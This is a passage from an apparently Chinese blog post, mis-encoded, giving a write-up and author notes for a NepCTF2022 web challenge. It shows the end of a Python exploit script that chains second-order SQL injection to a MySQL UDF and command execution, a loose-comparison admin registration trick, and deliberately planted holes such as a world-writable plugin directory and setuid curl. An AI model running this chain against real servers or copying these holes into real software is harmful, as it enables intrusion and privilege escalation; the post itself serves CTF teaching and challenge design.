    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">"[-]login as admin fail!"</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]write out file"</span><span class="token punctuation">)</span>
    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create function"</span><span class="token punctuation">)</span>
    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*]exec cmd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>



<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="ä¸­æ–‡ä¹±ç "><a href="#ä¸­æ–‡ä¹±ç " class="headerlink" title="ä¸­æ–‡ä¹±ç "></a>ä¸­æ–‡ä¹±ç </h3><p>è¿™ä¸ªæ˜¯å…¸ä¸­å…¸çš„é—®é¢˜äº†ï¼Œé¦–å…ˆæ•°æ®åº“è®¾ç½®ç¼–ç </p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> NAMES utf8mb4<span class="token punctuation">;</span></code></pre>

<p>å…¶æ¬¡è¡¨è®¾ç½®ç¼–ç </p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8</code></pre>

<p>å‘ç°è¿˜æ˜¯æœ‰ä¹±ç ï¼Œæ˜¯phpå’Œmysqlè¿æ¥æ—¶å€™çš„é—®é¢˜ï¼Œè¦åœ¨æ¯ä¸ª<code>$mysqli</code>å‰å…ˆè®¾ç½®å­—ç¬¦é›†ï¼š<code>set names utf8</code></p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">$mysqli &#x3D; new mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);
&#x2F;&#x2F; æ¯ä¸ª$mysqliè¿æ¥æ‰§è¡Œè¯­å¥å‰éƒ½è¦å…ˆæ‰§è¡Œ
mysqli_query($mysqli,&quot;set names utf8&quot;);</code></pre>

<p>è¿™æ ·å°±è§£å†³äº†ä¸­æ–‡ä¹±ç çš„é—®é¢˜</p>
<h3 id="x3D-x3D-x3D-ä¸-x3D-x3D-çš„é—®é¢˜"><a href="#x3D-x3D-x3D-ä¸-x3D-x3D-çš„é—®é¢˜" class="headerlink" title="&#x3D;&#x3D;&#x3D;ä¸&#x3D;&#x3D;çš„é—®é¢˜"></a>&#x3D;&#x3D;&#x3D;ä¸&#x3D;&#x3D;çš„é—®é¢˜</h3><p>åœ¨<code>register.php</code>ä¸­åŸå…ˆæœ‰åˆ¤æ–­<code>$_POST[&#39;username&#39;]==&#39;admin&#39;</code>ï¼Œå› ä¸ºæ˜¯å¼±ç­‰äºï¼Œå¯¼è‡´å¯ä»¥é‡æ–°æ³¨å†Œä¸€ä¸ªadminè´¦å·ï¼Œå¤ç°å¦‚ä¸‹</p>
<img src="/article/eruditeFlower/image-20221005111447545.png" class="" title="image-20221005111447545" loading="lazy">

<p>æ³¨å†Œäº†è´¦å·ï¼Œç„¶åæ‹¿<code>admin</code>ç™»å½•ï¼Œé<code>admin%a0</code></p>
<img src="/article/eruditeFlower/image-20221005111513524.png" class="" title="image-20221005111513524" loading="lazy">

<p>ç™»å½•æˆåŠŸã€‚åŸå…ˆä»¥ä¸ºæ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œåæ¥å‘ç°æ˜¯æ•°æ®åº“äº¤äº’çš„é—®é¢˜</p>
<p>åœ¨æ³¨å†Œçš„æ—¶å€™æœ‰è¿™æ ·ä¸€å¥è¯</p>
<p><code>$username = $mysqli-&gt;escape_string($_POST[&#39;username&#39;]);</code></p>
<p>$mysqli-&gt;escape_stringå‡ºæ¥çš„usernameæ²¡æœ‰è¢«æ­£ç¡®å­˜è¿›å»ï¼Œè€Œæ˜¯æ•°æ®åº“ç›´æ¥å­˜äº†ä¸€ä¸ªæ–°çš„adminè´¦å·</p>
<img src="/article/eruditeFlower/image-20221005111744267.png" class="" title="image-20221005111744267" loading="lazy">

<p>æˆ‘ä»¬æŠŠè¯­å¥æ‹¿å‡ºæ¥è¯•ä¸€ä¸‹</p>
<img src="/article/eruditeFlower/image-20221005111802999.png" class="" title="image-20221005111802999" loading="lazy">

<p>å¯ä»¥çœ‹åˆ°phpä¼ é€’sqlè¯­å¥çš„æ—¶å€™å¸¦äº†%a0ï¼ˆè¿™é‡Œæ˜æ˜¾çœ‹åˆ°<code>admin </code>åé¢æ˜¯æœ‰ä¸€ä¸ªç©ºä½çš„ï¼‰ï¼Œä½†æ˜¯sqlå¤„ç†çš„æ—¶å€™æ²¡æœ‰è®¤ï¼Œå¦‚æœè®¾ç½®äº†urlencodeå°±èƒ½çœ‹åˆ°äº†</p>
<img src="/article/eruditeFlower/image-20221005111910450.png" class="" title="image-20221005111910450" loading="lazy">

<p>è¿™é‡Œçš„é—®é¢˜å¯èƒ½å°†æ¥ä¹Ÿä¼šæ˜¯ä¸€ä¸ªè€ƒç‚¹ï¼Œä¸€ä¸ªå°trick</p>
<p>æ—¢ç„¶æ˜¯æ•°æ®åº“çš„é—®é¢˜ï¼Œé‚£ä¹ˆå°±å¾—æ›´æ”¹æ•°æ®çš„å­˜å‚¨æ–¹å¼äº†ï¼Œæœ€åè°ƒè¯•å¥½æƒ³æ·»åŠ urlencodeè¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Ÿ</p>
<p>ä¸ç®¡æ€æ ·é¦–å…ˆæŠŠ<code>register.php</code>åˆ¤æ–­æ”¹ä¸ºå¼ºæ¯”è¾ƒäº†</p>
<p><code>if ($_POST[&#39;username&#39;]===&#39;admin&#39;)</code></p>
<h3 id="adminç™»å½•ä¸Šè½¦çš„é—®é¢˜"><a href="#adminç™»å½•ä¸Šè½¦çš„é—®é¢˜" class="headerlink" title="adminç™»å½•ä¸Šè½¦çš„é—®é¢˜"></a>adminç™»å½•ä¸Šè½¦çš„é—®é¢˜</h3><p>å› ä¸ºäºŒæ¬¡æ³¨å…¥å¯ä»¥ä¿®æ”¹adminå¯†ç ï¼Œå› ä¸ºä¿ºä»¬æ˜¯composeèµ·çš„ç¯å¢ƒï¼Œå¹³å°ä¸æ”¯æŒåšåŠ¨æ€é¶æœºï¼Œæ¯”å¦‚è¯´å‰ä¸€ä½é€‰æ‰‹æ”¹äº†adminå¯†ç ä¸º123ï¼Œåä¸€ä½éšä¾¿ä¸€è¯•ç»“æœè¿›äº†â€¦â€¦å°±å¾ˆå°´å°¬äº†ã€‚å› ä¸ºsessionæ˜¯ä¸æ¸…çš„ï¼Œæ‰€ä»¥åªè¦ç™»å½•äº†adminå°±ç®—é€šè¿‡ï¼Œé¶æœºé‡ç½®ä¹Ÿä¸ä¼šå½±å“å·²ç»ç™»å½•adminçš„é€‰æ‰‹ã€‚å› æ­¤åœ¨loginå¤„æ·»åŠ äº†è¿™ä¸€æ®µ</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰é€‰æ‰‹çˆ†ç ´å‘¢ï¼Œæ¦‚ç‡å¾ˆä½å½“ç„¶ä¹Ÿä¸æ˜¯ä¸å¯èƒ½ï¼Œé¶æœºé‡ç½®åŒæ—¶ä¹Ÿä¼šé‡ç½®adminå¯†ç ï¼Œè€Œé¶æœºé‡ç½®çš„å¯†ç è§„åˆ™æ˜¯è¿™æ ·çš„</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TRUNCATE</span> <span class="token keyword">TABLE</span> score<span class="token punctuation">.</span>users<span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> score<span class="token punctuation">.</span>users <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'`head /dev/urandom | cksum | md5sum | cut -c 1-32`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>é€‰æ‰‹å¹¶ä¸çŸ¥é“ï¼Œæ‰€ä»¥æ¦‚ç‡ä½ï¼Œå½“ç„¶phpä¸­ç™»å½•å°±ä¿®æ”¹adminå¯†ç åªæ˜¯åŠ äº†ä¸€å±‚å¤æ‚æ€§ï¼Œè€Œä¸”çˆ†ç ´ä¼šè¢«bançš„è¾£</p>
<h3 id="é¢˜ç›®æƒé™é…ç»™"><a href="#é¢˜ç›®æƒé™é…ç»™" class="headerlink" title="é¢˜ç›®æƒé™é…ç»™"></a>é¢˜ç›®æƒé™é…ç»™</h3><p>é¦–å…ˆç”±äºè¦å†™udfï¼Œè€Œä¸”æ˜¯ç«™åº“åˆ†ç¦»çš„ç»“æ„ï¼Œæ‰€ä»¥ç»™äºˆmysqlçš„æœåŠ¡å™¨æ’ä»¶ç›®å½•å†™å’Œæ‰§è¡Œæƒé™</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> /usr/lib64/mysql/plugin/</code></pre>

<p>æœ€åä¸€æ­¥è¦ç”¨sä½çš„curlææƒï¼Œæ”¶å›ç”¨æˆ·å’Œç»„çš„æƒé™ï¼Œç»™curlæ·»åŠ sä½</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">700</span> /flag <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +s /bin/curl</code></pre>

<h4 id="æ•°æ®åº“çš„æƒé™ä¸è¢«æ…shiåçš„ä¿®æ”¹"><a href="#æ•°æ®åº“çš„æƒé™ä¸è¢«æ…shiåçš„ä¿®æ”¹" class="headerlink" title="æ•°æ®åº“çš„æƒé™ä¸è¢«æ…shiåçš„ä¿®æ”¹"></a>æ•°æ®åº“çš„æƒé™ä¸è¢«æ…shiåçš„ä¿®æ”¹</h4><p>mysqlæ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ctfï¼Œåˆ†åˆ«ç”¨åˆ°ä»¥ä¸‹è¡¨</p>
<table>
<thead>
<tr>
<th align="center">è¡¨å</th>
<th align="center">ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center">challengesAll</td>
<td align="center">æ‰€æœ‰çš„é¢˜ç›®</td>
</tr>
<tr>
<td align="center">randChallenges</td>
<td align="center">ç”¨æˆ·æŠ½å–åˆ°çš„é¢˜ç›®ç¼–å·</td>
</tr>
<tr>
<td align="center">score</td>
<td align="center">ç”¨æˆ·åšé¢˜å¾—åˆ†</td>
</tr>
<tr>
<td align="center">userAnswer</td>
<td align="center">ç”¨æˆ·æäº¤çš„ç­”æ¡ˆ</td>
</tr>
<tr>
<td align="center">users</td>
<td align="center">ç”¨æˆ·æ³¨å†Œè¡¨</td>
</tr>
<tr>
<td align="center">ctf</td>
<td align="center">æç¤ºè¡¨</td>
</tr>
</tbody></table>
<p>çœ‹è¯­å¥</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'ctf'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>challengesAll <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>randChallenges <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>score <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>userAnswer <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>users <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>ctf <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>

<span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre>

<p>åé¢ä¼šè®²ä¸ºä½•è¿™æ ·ç»™äºˆï¼Œæœ€å°æƒé™åŸåˆ™</p>
<h5 id="challengesAll"><a href="#challengesAll" class="headerlink" title="challengesAll"></a>challengesAll</h5><p><code>challengesAll</code>æ˜¯æ‰€æœ‰çš„é¢˜ç›®ï¼Œæˆ‘åªéœ€è¦æå–é¢˜ç›®ä¿¡æ¯ï¼Œåœ¨é¢˜ç›®ä¸Šçº¿æ—¶å·²ç»ç¡®å®šï¼Œæ‰€ä»¥åªéœ€ç»™äºˆ<code>select</code>æƒé™å³å¯</p>
<h5 id="randChallenges"><a href="#randChallenges" class="headerlink" title="randChallenges"></a>randChallenges</h5><p><code>randChallenges</code>æ˜¯ç”¨æˆ·æŠ½å–åˆ°çš„é¢˜ç›®ï¼Œå‰é¢æµç¨‹åˆ†æè¯´è¿‡ï¼Œç”¨æˆ·åœ¨æ³¨å†Œçš„æ—¶å€™ä¼šæŠ½å–é¢˜ç›®æ’å…¥åˆ°æ­¤è¡¨ï¼Œå› æ­¤éœ€è¦<code>insert</code>æƒé™ï¼ŒåŒæ—¶åœ¨ä¸»é¡µç”¨æˆ·éœ€è¦åšé¢˜ï¼Œå› æ­¤è¿˜éœ€è¦<code>select</code>æƒé™</p>
<h5 id="score-1"><a href="#score-1" class="headerlink" title="score"></a>score</h5><p><code>score</code>æ˜¯ç”¨æˆ·çš„åˆ†æ•°è¡¨ï¼Œç”¨æˆ·åšå®Œé¢˜åä¼šæ’å…¥ä¸€æ¡è®°å½•è®°ç”¨æˆ·çš„åˆ†æ•°ï¼Œå› æ­¤éœ€è¦<code>select,insert</code>æƒé™</p>
<h5 id="userAnswer"><a href="#userAnswer" class="headerlink" title="userAnswer"></a>userAnswer</h5><p><code>userAnswer</code>å­˜å‚¨ç”¨æˆ·æäº¤çš„ç­”æ¡ˆï¼ŒåŸå› åŒä¸Šï¼Œä¹Ÿæ˜¯éœ€è¦<code>select,insert</code>æƒé™</p>
<h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p><code>users</code>æ˜¯ç”¨æˆ·è¡¨ï¼ŒåŒ…æ‹¬ç”¨æˆ·çš„å¢æ”¹æŸ¥ï¼Œæ˜¯æ­£å¸¸çš„æ³¨å†Œç³»ç»Ÿçš„è¡¨æƒé™ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œå¯ä»¥å‡ºç°ä¿®æ”¹adminå¯†ç çš„æ“ä½œ</p>
<h5 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h5><p><code>ctf</code>å°±æ˜¯ä¸ªæç¤ºè¡¨ï¼Œæ²¡æœ‰äº¤äº’ï¼Œéšæ„æƒé™</p>
<h5 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h5><p>å› ä¸ºè¦å†™udfï¼Œè¦ç»™äºˆ<code>file,insert</code>æƒé™æ¥åˆ›å»ºå’Œè½åœ°</p>
<h4 id="æ¯”èµ›ä¸­å‡ºç°æ…ğŸ’©çš„çŠ¶å†µ"><a href="#æ¯”èµ›ä¸­å‡ºç°æ…ğŸ’©çš„çŠ¶å†µ" class="headerlink" title="æ¯”èµ›ä¸­å‡ºç°æ…ğŸ’©çš„çŠ¶å†µ"></a>æ¯”èµ›ä¸­å‡ºç°æ…ğŸ’©çš„çŠ¶å†µ</h4><p>æŸä¸€å¤©æ™šä¸Šï¼Œçªç„¶å‘ç°é¢˜ç›®å…¨éƒ¨è¢«äººä¿®æ”¹äº†ï¼ŒåŸå› å°±æ˜¯æƒé™ç»™å¤šäº†</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre>

<p>å›¾çœäº‹ä¹‹å‰æ˜¯è¿™æ ·ç»™çš„æƒé™ï¼Œä¸ç¬¦åˆæœ€å°æƒé™åŸåˆ™ï¼Œè¿™æ¬¡ä¹‹åä¹Ÿæ˜¯ç‹ ç‹ å­¦ä¹ äº†ä¸€ä¸‹</p>
<h5 id="ä¸´æ—¶æªæ–½"><a href="#ä¸´æ—¶æªæ–½" class="headerlink" title="ä¸´æ—¶æªæ–½"></a>ä¸´æ—¶æªæ–½</h5><p>å½“æ—¶å‡ºç°äº†è¿™æ ·çš„æƒ…å†µï¼Œæ‰€ä»¥ç¬¬ä¸€æ—¶é—´é¦–å…ˆå¤åŸäº†é¢˜ç›®ï¼Œå¹¶ä¸”åœ¨ç¾¤é‡Œé€šçŸ¥é€‰æ‰‹ä¸è¦ä¿®æ”¹äº†ï¼Œå› ä¸ºè¿™é‡Œå¯¹è§£é¢˜æ²¡æœ‰å¸®åŠ©ï¼Œåœ¨æ­¤å¤„ä¹Ÿä¸å­˜åœ¨éé¢„æœŸå¯ä»¥å¸®åŠ©è§£é¢˜ï¼Œä¸ºäº†é˜²æ­¢åŒå­¦èµ°æ­ªè·¯å°±é€šçŸ¥äº†ä¸€ä¸‹ï¼Œä½†æ˜¯æ²¡ç”¨ï¼Œå¤åŸäº†è¿˜æ˜¯è¢«æ‰“äº†ã€‚</p>
<p>æ‰€ä»¥ä½¿ç”¨é”æœºåˆ¶å…ˆé™åˆ¶ä¸€ä¸‹ï¼Œmysqlæœ‰ä¸‰ç§çº§åˆ«çš„é”å®šæœºåˆ¶ï¼šè¡¨çº§é”å®šï¼Œè¡Œçº§é”å®šå’Œé¡µçº§é”å®šï¼Œé¦–å…ˆé”å®šè¡¨ï¼Œé˜²æ­¢è¢«è¿›ä¸€æ­¥ç ´å</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">LOCK</span> <span class="token keyword">TABLES</span> challengesAll<span class="token punctuation">;</span></code></pre>

<p>ç„¶åå¼€å§‹æ£€ç´¢æƒé™ï¼ŒæŒ‰ç…§æœ€å°æƒé™åŸåˆ™ä»æ–°åˆ†é…æƒé™ï¼Œæœ€åä¸‹çº¿é¢˜ç›®ï¼Œé‡æ–°éƒ¨ç½²</p>
<h3 id="é¢˜ç›®è¢«çˆ†ç ´"><a href="#é¢˜ç›®è¢«çˆ†ç ´" class="headerlink" title="é¢˜ç›®è¢«çˆ†ç ´"></a>é¢˜ç›®è¢«çˆ†ç ´</h3><p>å½“æ—¶åœ¨è§£å†³æ…shiçš„é—®é¢˜ï¼Œç„¶åå‘ç°å¤šæ¬¡è­¦å‘Šåä»ç„¶æœ‰åŒå­¦åœ¨çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼Œç›´æ¥æ‰‹åŠ¨å°ç¦</p>
<p>ä»dockerå†…éƒ¨çš„è¯éœ€è¦é«˜çº§æƒé™<code>--privileged</code>ï¼Œä½†æ˜¯è¿™æ ·ä¼šæœ‰å®‰å…¨æ€§é—®é¢˜ï¼ˆè‘—åçš„dockerå®¿ä¸»æœºææƒï¼‰ï¼Œäºæ˜¯ç›´æ¥åœ¨éƒ¨ç½²æœåŠ¡å™¨ä¸Šå°ç¦ï¼ŒåŸå…ˆçš„å‘½ä»¤æ˜¯è¿™æ ·çš„</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP <span class="token parameter variable">-dport</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span></code></pre>

<p>ä½†æ˜¯å‘ç°å¥½åƒæ²¡ç”Ÿæ•ˆï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œéœ€è¦é…ç»™dockerç”¨æˆ·ï¼Œäºæ˜¯ç›´æ¥å°ç¦</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> DOCKER <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP</code></pre>

<p>ç›´æ¥å°äº†</p>
<h3 id="é¢˜ç›®é‡ç½®"><a href="#é¢˜ç›®é‡ç½®" class="headerlink" title="é¢˜ç›®é‡ç½®"></a>é¢˜ç›®é‡ç½®</h3><p>ç¯å¢ƒéœ€è¦é‡ç½®ï¼Œä¸€æ˜¯æ›´æ–°adminå¯†ç ï¼ŒäºŒæ˜¯æ¸…ç©ºç”¨æˆ·æ•°æ®å’Œudfï¼Œæ¯”èµ›æ—¶é—´è¾ƒé•¿ï¼Œè¦æ˜¯ä¸€ç›´ä¸æ¸…ä¼šæœ‰å¤§é‡æ•°æ®</p>
<p>æœªå®Œå¾…ç»­â€¦</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">å¦‚æœè§‰å¾—æˆ‘çš„æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œå¯ä»¥è¯·ä¿ºå–å†°é˜”è½</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/alipay.jpg"><img loading="lazy" src="/images/alipay.jpg" alt="æ”¯ä»˜å®" title="æ”¯ä»˜å®"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qq.jpg"><img loading="lazy" src="/images/qq.jpg" alt="QQ æ”¯ä»˜" title="QQ æ”¯ä»˜"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wechat.jpg"><img loading="lazy" src="/images/wechat.jpg" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>Err0r</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://err0r.top/article/eruditeFlower/" title="NepCTF2022åšå­¦å¤šé—»çš„èŠ±èŠ±WP&amp;å‡ºé¢˜ç¬”è®°">https://err0r.top/article/eruditeFlower/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> è®¸å¯åè®®ã€‚</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/article/penetrationtest/" rel="next" title="è®°ä¸€æ¬¡æ•™å¸ˆæœºç¯å¢ƒçš„æ¸—é€"><span class="post-nav-text">è®°ä¸€æ¬¡æ•™å¸ˆæœºç¯å¢ƒçš„æ¸—é€</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>è‹¥æ‚¨æƒ³åŠæ—¶å¾—åˆ°å›å¤æé†’ï¼Œå»ºè®®ç§å‘é‚®ä»¶è”ç³»ã€‚</span><br><span>è¯„è®ºè¯·éµå®ˆè¯„è®ºå…¬å¾·ï¼Œåšä¸»ä¼šä¸å®šæ—¶æ£€æŸ¥è¯„è®ºå¹¶è¿›è¡Œå›å¤ã€‚</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/article/eruditeFlower/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è‹ICPå¤‡20028116å·-1</a></div><div class="copyright"><span>&copy; 2020 â€“ 2023 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Err0r</span></div><div class="live-time"><span>æœ¬åšå®¢å·²åœ¨å„ç§ç¾éš¾ä¸­è¿è¡Œäº†</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-10-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} å¤© ${passHour} å°æ—¶ ${passMinute} åˆ† ${passSecond} ç§’`;
}
blog_live_time();
</script></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="æ€»è®¿å®¢é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="æ€»è®¿é—®é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#000000" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
